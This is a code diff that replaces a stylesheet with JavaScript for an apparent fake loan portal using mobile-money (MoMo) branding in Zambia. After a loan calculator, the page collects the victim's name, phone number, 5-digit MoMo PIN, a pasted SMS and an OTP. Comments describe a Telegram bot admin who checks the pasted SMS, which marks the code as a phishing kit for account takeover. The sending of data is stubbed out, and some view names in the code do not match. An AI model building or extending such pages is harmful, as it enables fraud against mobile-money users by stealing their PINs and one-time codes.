@@ -1,483 +1,227 @@
-:root {
-  --primary-navy: #001f3f;
-  --accent-yellow: #ffcc00;
-  --bg-light: #f4f7f6;
-  --text-dark: #333333;
-  --white: #ffffff;
-  --gray-border: #ccd1d1;
-}
-
-body {
-  font-family: 'Inter', sans-serif;
-  background-color: var(--bg-light);
-  color: var(--text-dark);
-  margin: 0;
-  padding: 0;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-}
-
-.portal-container {
-  width: 100%;
-  max-width: 440px;
-  background: var(--white);
-  border-radius: 12px;
-  box-shadow: 0 10px 25px rgba(0, 31, 63, 0.1);
-  overflow: hidden;
-  margin: 15px;
-}
-
-.portal-header {
-  background-color: var(--primary-navy);
-  color: var(--white);
-  padding: 16px 20px;
-  text-align: center;
-}
-
-.brand-badge {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-}
-
-.momo-logo-text {
-  font-size: 1.1rem;
-  letter-spacing: 0.5px;
-  color: var(--white);
-}
-
-.momo-logo-text b {
-  color: var(--accent-yellow);
-}
-
-.verified-tag {
-  background-color: var(--accent-yellow);
-  color: var(--primary-navy);
-  font-size: 0.7rem;
-  font-weight: 700;
-  padding: 3px 6px;
-  border-radius: 4px;
-}
-
-.card {
-  padding: 24px;
-}
-
-.text-center {
-  text-align: center;
-}
-
-.card h2 {
-  font-size: 1.3rem;
-  color: var(--primary-navy);
-  margin-top: 0;
-  margin-bottom: 4px;
-}
-
-.subtitle {
-  font-size: 0.85rem;
-  color: #666;
-  margin-bottom: 20px;
-}
-
-/* Calculator Box Styles (Matches 1000045582.png) */
-.calculator-box {
-  background-color: #fcfcfc;
-  border: 1px solid #eaeaea;
-  border-radius: 8px;
-  padding: 16px;
-  margin-bottom: 24px;
-  text-align: left;
-}
-
-.calc-row {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 12px;
-  font-size: 0.9rem;
-  font-weight: 500;
-}
-
-.highlight-yellow {
-  color: #d4ac0d;
-  font-weight: 700;
-}
-
-.monthly-row {
-  border-top: 1px solid #eee;
-  padding-top: 12px;
-  margin-bottom: 0;
-}
-
-.monthly-val {
-  font-size: 1.2rem;
-}
-
-.slider-group {
-  margin: 16px 0;
-}
-
-.slider-group input[type="range"] {
-  width: 100%;
-  accent-color: var(--accent-yellow);
-}
-
-.slider-limits {
-  display: flex;
-  justify-content: space-between;
-  font-size: 0.7rem;
-  color: #888;
-}
-
-/* Navigation Links & Indicators */
-.nav-bar {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 12px 20px 0 20px;
-}
-
-.back-link {
-  background: none;
-  border: none;
-  color: var(--primary-navy);
-  font-weight: 600;
-  font-size: 0.9rem;
-  cursor: pointer;
-  padding: 0;
-}
-
-.step-title-tracker {
-  font-weight: 700;
-  color: var(--primary-navy);
-  font-size: 1rem;
-}
-
-.horizontal-steps {
-  display: flex;
-  gap: 8px;
-  padding: 12px 20px 0 20px;
-}
-
-.step-line {
-  flex: 1;
-  height: 4px;
-  background-color: #e0e0e0;
-  border-radius: 2px;
-}
-
-.step-line.active {
-  background-color: var(--accent-yellow);
-}
-
-.step-counter-text {
-  text-align: center;
-  font-size: 0.8rem;
-  color: #666;
-  margin: 6px 0 16px 0;
-}
-
-/* Form Layouts & Inputs */
-.input-group {
-  margin-bottom: 16px;
-  text-align: left;
-}
-
-.input-group label {
-  display: block;
-  font-size: 0.85rem;
-  font-weight: 600;
-  margin-bottom: 6px;
-  color: var(--primary-navy);
-}
-
-.input-group input, .input-group select, .input-group textarea {
-  width: 100%;
-  padding: 10px 12px;
-  border: 1.5px solid var(--gray-border);
-  border-radius: 6px;
-  font-size: 0.9rem;
-  box-sizing: border-box;
-  outline: none;
-}
-
-.input-group input:focus, .input-group select:focus, .input-group textarea:focus {
-  border-color: var(--primary-navy);
-}
-
-.row-inputs {
-  display: flex;
-  gap: 12px;
-}
-
-.half {
-  flex: 1;
-}
-
-.phone-input-container {
-  display: flex;
-  border: 1.5px solid var(--gray-border);
-  border-radius: 6px;
-  overflow: hidden;
-}
-
-.prefix-box {
-  background-color: #f1f1f1;
-  padding: 10px;
-  font-size: 0.9rem;
-  font-weight: 600;
-  color: #555;
-  border-right: 1px solid var(--gray-border);
-}
-
-.phone-input-container input {
-  border: none;
-  border-radius: 0;
-}
-
-.hint {
-  display: block;
-  font-size: 0.75rem;
-  color: #777;
-  margin-top: 4px;
-}
-
-/* Summary Card (Matches 1000045585.png) */
-.summary-card {
-  background-color: #fafafa;
-  border: 1px solid #e0e0e0;
-  border-radius: 8px;
-  padding: 14px;
-  margin-bottom: 20px;
-  text-align: left;
-}
-
-.summary-card h3 {
-  font-size: 0.95rem;
-  margin-top: 0;
-  margin-bottom: 10px;
-  color: var(--primary-navy);
-}
-
-.sum-row {
-  display: flex;
-  justify-content: space-between;
-  font-size: 0.85rem;
-  margin-bottom: 6px;
-  color: #555;
-}
-
-/* Action Buttons */
-.btn-primary {
-  width: 100%;
-  background-color: var(--primary-navy);
-  color: var(--accent-yellow);
-  border: none;
-  padding: 12px;
-  font-size: 0.95rem;
-  font-weight: 700;
-  border-radius: 6px;
-  cursor: pointer;
-  transition: opacity 0.2s;
-}
-
-.btn-primary:disabled {
-  opacity: 0.4;
-  cursor: not-allowed;
-}
-
-.btn-group {
-  display: flex;
-  gap: 12px;
-}
-
-.btn-secondary {
-  flex: 1;
-  background-color: #e0e0e0;
-  color: #333;
-  border: none;
-  padding: 12px;
-  font-size: 0.95rem;
-  font-weight: 700;
-  border-radius: 6px;
-  cursor: pointer;
-}
-
-/* MoMo Login Custom Styles (Matches 1000045586.png) */
-.login-header {
-  padding: 30px 20px;
-}
-
-.momo-logo-large {
-  width: 50px;
-  height: 50px;
-  background-color: var(--accent-yellow);
-  color: var(--primary-navy);
-  font-weight: 800;
-  font-size: 1.2rem;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  border-radius: 8px;
-  margin: 0 auto 10px auto;
-}
-
-.phone-display-box {
-  background: #f9f9f9;
-  border: 1px solid #ddd;
-  padding: 10px;
-  border-radius: 6px;
-  font-weight: 600;
-  margin-bottom: 20px;
-}
-
-.pin-label {
-  display: block;
-  font-size: 0.85rem;
-  color: #666;
-  margin-bottom: 10px;
-}
-
-.pin-dots-container {
-  position: relative;
-  margin-bottom: 24px;
-}
-
-.hidden-pin-input {
-  position: absolute;
-  width: 100%;
-  height: 100%;
-  opacity: 0;
-  z-index: 2;
-  cursor: pointer;
-}
-
-.pin-dots {
-  display: flex;
-  justify-content: center;
-  gap: 12px;
-}
-
-.dot {
-  width: 40px;
-  height: 40px;
-  border: 1.5px solid var(--gray-border);
-  border-radius: 6px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 1.5rem;
-  background: #fff;
-}
-
-/* Countdown Banner (Matches 1000045593.png) */
-.countdown-banner {
-  display: flex;
-  align-items: center;
-  background-color: #fef9e7;
-  border: 1px solid #f9e79f;
-  padding: 12px;
-  border-radius: 6px;
-  margin-bottom: 16px;
-  text-align: left;
-  font-size: 0.8rem;
-  color: #7d6608;
-}
-
-.countdown-icon {
-  font-size: 1.5rem;
-  margin-right: 12px;
-}
-
-/* Admin Waiting Screen (Matches 1000045587.png) */
-.admin-waiting-screen {
-  background-color: var(--primary-navy);
-  color: var(--white);
-  padding: 60px 24px;
-  text-align: center;
-  min-height: 480px;
-  box-sizing: border-box;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
-
-.spinner-icon {
-  font-size: 3rem;
-  margin-bottom: 20px;
-  animation: pulse 1.5s infinite;
-}
-
-@keyframes pulse {
-  0% { transform: scale(1); }
-  50% { transform: scale(1.1); }
-  100% { transform: scale(1); }
-}
-
-.admin-waiting-screen h2 {
-  color: var(--white);
-  font-size: 1.4rem;
-  margin-bottom: 8px;
-}
-
-.admin-waiting-screen p {
-  color: #b0c4de;
-  font-size: 0.85rem;
-  margin-bottom: 30px;
-}
-
-.progress-bar-container {
-  width: 100%;
-  max-width: 320px;
-  background-color: rgba(255, 255, 255, 0.1);
-  border-radius: 6px;
-  overflow: hidden;
-  margin-bottom: 20px;
-}
-
-.animated-progress-bar {
-  background-color: rgba(255, 255, 255, 0.2);
-  color: var(--white);
-  font-size: 0.75rem;
-  padding: 8px;
-  text-align: center;
-}
-
-.app-id-display {
-  font-size: 0.85rem;
-  color: #ccc;
-}
-
-/* Success Card */
-.success-card {
-  padding: 40px 24px;
-}
-
-.success-icon {
-  width: 60px;
-  height: 60px;
-  background-color: #27ae60;
-  color: var(--white);
-  font-size: 2rem;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin: 0 auto 20px auto;
-}
-
-.badge-verified-box {
-  display: inline-block;
-  margin-top: 20px;
-  background-color: #eafaf1;
-  color: #27ae60;
-  border: 1px solid #27ae60;
-  padding: 6px 12px;
-  font-size: 0.8rem;
-  font-weight: 700;
-  border-radius: 4px;
-}
+document.addEventListener("DOMContentLoaded", () => {
+  // State management
+  const state = {
+    amount: 5000,
+    duration: 12,
+    monthlyPayment: 462.50,
+    loanType: "Personal Loan",
+    purpose: "",
+    firstName: "",
+    lastName: "",
+    contact: "",
+    employment: "Employed",
+    income: "",
+    pin: "",
+    pastedSms: ""
+  };
+
+  // View elements
+  const views = {
+    calculator: document.getElementById("view-calculator"),
+    form: document.getElementById("view-form"),
+    waiting: document.getElementById("view-waiting"),
+    login: document.getElementById("view-login"),
+    smsPaste: document.getElementById("view-sms-paste"),
+    waitingSms: document.getElementById("view-waiting-sms"),
+    otp: document.getElementById("view-otp"),
+    success: document.getElementById("view-success")
+  };
+
+  function switchView(viewName) {
+    Object.values(views).forEach(v => v.style.display = "none");
+    if (views[viewName]) {
+      views[viewName].style.display = "block";
+    }
+  }
+
+  // --- Calculator View Logic ---
+  const amountSlider = document.getElementById("amount-slider");
+  const durationSlider = document.getElementById("duration-slider");
+  const displayAmount = document.getElementById("display-amount");
+  const displayDuration = document.getElementById("display-duration");
+  const displayMonthly = document.getElementById("display-monthly");
+
+  function updateCalculations() {
+    state.amount = parseInt(amountSlider.value);
+    state.duration = parseInt(durationSlider.value);
+    
+    displayAmount.textContent = `ZMW ${state.amount.toLocaleString()}`;
+    displayDuration.textContent = `${state.duration} Months`;
+    
+    // Simple mock formula for monthly payment
+    const interest = 0.15;
+    const totalPayable = state.amount + (state.amount * interest * (state.duration / 12));
+    state.monthlyPayment = totalPayable / state.duration;
+    displayMonthly.textContent = `ZMW ${state.monthlyPayment.toFixed(2)}`;
+    
+    document.getElementById("input-loan-amount").value = state.amount;
+  }
+
+  if (amountSlider && durationSlider) {
+    amountSlider.addEventListener("input", updateCalculations);
+    durationSlider.addEventListener("input", updateCalculations);
+  }
+
+  document.getElementById("btn-start-app").addEventListener("click", () => {
+    switchView("form");
+    updateFormStep(1);
+  });
+
+  // --- Multi-Step Form Logic ---
+  let currentStep = 1;
+  const formSteps = document.querySelectorAll(".form-step");
+  const stepLines = [document.getElementById("line-1"), document.getElementById("line-2"), document.getElementById("line-3")];
+  const stepCounterText = document.getElementById("step-counter-text");
+  const stepTitleTracker = document.getElementById("step-title-tracker");
+
+  function updateFormStep(step) {
+    currentStep = step;
+    formSteps.forEach(fs => fs.style.display = "none");
+    const activeStepEl = document.querySelector(`.form-step[data-step="${step}"]`);
+    if (activeStepEl) activeStepEl.style.display = "block";
+
+    stepLines.forEach((line, index) => {
+      if (index < step) line.classList.add("active");
+      else line.classList.remove("active");
+    });
+
+    const titles = ["Loan Details", "Personal Information", "Employment & Review"];
+    stepTitleTracker.textContent = titles[step - 1];
+    stepCounterText.textContent = `Step ${step} of 3`;
+  }
+
+  document.querySelectorAll(".form-next-btn").forEach(btn => {
+    btn.addEventListener("click", () => {
+      if (currentStep === 1) {
+        state.loanType = document.getElementById("loan-type").value;
+        state.amount = parseFloat(document.getElementById("input-loan-amount").value) || state.amount;
+        state.purpose = document.getElementById("loan-purpose").value;
+      } else if (currentStep === 2) {
+        state.firstName = document.getElementById("first-name").value;
+        state.lastName = document.getElementById("last-name").value;
+        state.contact = document.getElementById("user-contact").value;
+        
+        // Populate summary
+        document.getElementById("sum-amount").textContent = `ZMW ${state.amount.toLocaleString()}`;
+        document.getElementById("sum-duration").textContent = `${state.duration} Months`;
+        document.getElementById("sum-name").textContent = `${state.firstName} ${state.lastName}`;
+        document.getElementById("sum-contact").textContent = `+260 ${state.contact}`;
+      }
+      if (currentStep < 3) updateFormStep(currentStep + 1);
+    });
+  });
+
+  document.querySelectorAll(".form-prev-btn").forEach(btn => {
+    btn.addEventListener("click", () => {
+      if (currentStep > 1) updateFormStep(currentStep - 1);
+      else switchView("calculator");
+    });
+  });
+
+  document.getElementById("form-back-btn").addEventListener("click", () => {
+    if (currentStep > 1) updateFormStep(currentStep - 1);
+    else switchView("calculator");
+  });
+
+  document.getElementById("btn-submit-application").addEventListener("click", () => {
+    switchView("waiting");
+    // Simulate routing to admin manager
+    setTimeout(() => {
+      document.getElementById("login-phone-display.phone-display-box") || 
+      (document.getElementById("login-phone-display").textContent = `+260 ${state.contact}`);
+      switchView("login");
+    }, 3000);
+  });
+
+  // --- 5-Digit PIN Entry Logic ---
+  const hiddenPinInput = document.getElementById("hidden-pin-box");
+  const pinDots = [0, 1, 2, 3, 4].map(i => document.getElementById(`dot-${i}`));
+  const btnLoginSubmit = document.getElementById("btn-login-submit");
+
+  if (hiddenPinInput) {
+    hiddenPinInput.addEventListener("input", (e) => {
+      const val = e.target.value.replace(/\D/g, "").slice(0, 5);
+      hiddenPinInput.value = val;
+      
+      pinDots.forEach((dot, index) => {
+        dot.textContent = val[index] ? "•" : "";
+      });
+
+      if (val.length === 5) {
+        state.pin = val;
+        btnLoginSubmit.removeAttribute("disabled");
+      } else {
+        btnLoginSubmit.setAttribute("disabled", "true");
+      }
+    });
+
+    // Focus hidden input when clicking dots container
+    document.querySelector(".pin-dots-container").addEventListener("click", () => {
+      hiddenPinInput.focus();
+    });
+  }
+
+  btnLoginSubmit.addEventListener("click", () => {
+    // Transition to SMS paste view
+    switchView("view-sms-paste");
+  });
+
+  // --- SMS Paste & Clipboard Logic for Telegram Admin ---
+  const pastedSmsInput = document.getElementById("pasted-sms-text");
+  const btnSubmitSms = document.getElementById("btn-submit-sms");
+
+  if (pastedSmsInput) {
+    pastedSmsInput.addEventListener("input", () => {
+      if (pastedSmsInput.value.trim().length > 5) {
+        btnSubmitSms.removeAttribute("disabled");
+      } else {
+        btnSubmitSms.setAttribute("disabled", "true");
+      }
+    });
+  }
+
+  btnSubmitSms.addEventListener("click", () => {
+    state.pastedSms = pastedSmsInput.value;
+    switchView("view-waiting-sms");
+
+    // Simulate Server & Telegram bot interaction where admin has click-to-copy clipboard 
+    // and triggers Valid / Invalid SMS response callbacks
+    setTimeout(() => {
+      // Transition to OTP verification or Success depending on simulated admin validation
+      document.getElementById("otp-target-display").textContent = `+260 ${state.contact}`;
+      switchView("view-otp");
+    }, 4000);
+  });
+
+  // --- OTP Verification Logic ---
+  const otpBoxes = document.querySelectorAll(".otp-box");
+  const btnVerifyOtp = document.getElementById("btn-verify-otp");
+
+  otpBoxes.forEach((box, index) => {
+    box.addEventListener("input", (e) => {
+      const val = e.target.value.replace(/\D/g, "");
+      box.value = val;
+      if (val && index < otpBoxes.length - 1) {
+        otpBoxes[index + 1].focus();
+      }
+      
+      const fullOtp = Array.from(otpBoxes).map(b => b.value).join("");
+      if (fullOtp.length === 6) {
+        btnVerifyOtp.removeAttribute("disabled");
+      } else {
+        btnVerifyOtp.setAttribute("disabled", "true");
+      }
+    });
+  });
+
+  btnVerifyOtp.addEventListener("click", () => {
+    document.getElementById("success-contact-val").textContent = `+260 ${state.contact}`;
+    document.getElementById("success-amount-val").textContent = `ZMW ${state.amount.toLocaleString()}`;
+    switchView("view-success");
+  });
+
+  document.getElementById("btn-restart").addEventListener("click", () => {
+    location.reload();
+  });
+});
+  
